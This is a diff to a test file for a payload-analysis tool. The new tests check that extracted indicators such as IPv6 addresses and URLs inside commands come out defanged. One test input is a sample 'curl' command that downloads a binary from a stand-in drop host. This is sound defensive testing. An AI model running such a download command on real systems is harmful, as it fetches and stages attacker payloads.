@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { analyse, flatten, toMarkdown } from './index';
+import { extractIndicators } from './analysis/indicators';
 
 /**
  * A payload shaped the way real ones are: Base64 over Base64 over gzip over
@@ -62,6 +63,41 @@ describe('analysis', () => {
     expect(url?.defanged).toContain('hxxp');
     expect(url?.defanged).not.toContain('.top');
     expect(url?.defanged).toContain('[.]');
+  });
+
+  /*
+   * The interface tells the reader every indicator is safe to paste. Two kinds
+   * were not: an IPv6 address has no dots for the ordinary transform to touch,
+   * and a command line carries whatever URL it was built around straight
+   * through. Both came out of the engine exactly as routable as they went in.
+   */
+  it('defangs an IPv6 address, which has no dots to neutralise', () => {
+    const [found] = extractIndicators('callback to 2001:0db8:85a3:0000:0000:8a2e:0370:7334 now', 0, 'Input');
+
+    expect(found?.kind).toBe('ipv6');
+    expect(found?.defanged).not.toBe(found?.value);
+    expect(found?.defanged).toContain('[:]');
+    expect(found?.defanged).not.toMatch(/[0-9a-f]:[0-9a-f]/i);
+  });
+
+  it('defangs the URL a command was built around', () => {
+    const found = extractIndicators('curl http://drop.example.com/a.bin -o x', 0, 'Input').find(
+      (i) => i.kind === 'command',
+    );
+
+    expect(found?.defanged).toContain('hxxp');
+    expect(found?.defanged).not.toContain('http://');
+    expect(found?.defanged).not.toContain('drop.example.com');
+  });
+
+  it('leaves alone the kinds nothing would linkify', () => {
+    const path = extractIndicators('dropped to C:\\Users\\Public\\svc.exe today', 0, 'Input').find(
+      (i) => i.kind === 'path',
+    );
+
+    // Mangling a file path costs readability and buys nothing: no client turns
+    // one into a link.
+    expect(path?.defanged).toBe(path?.value);
   });
 
   it('raises the security findings the content justifies', async () => {
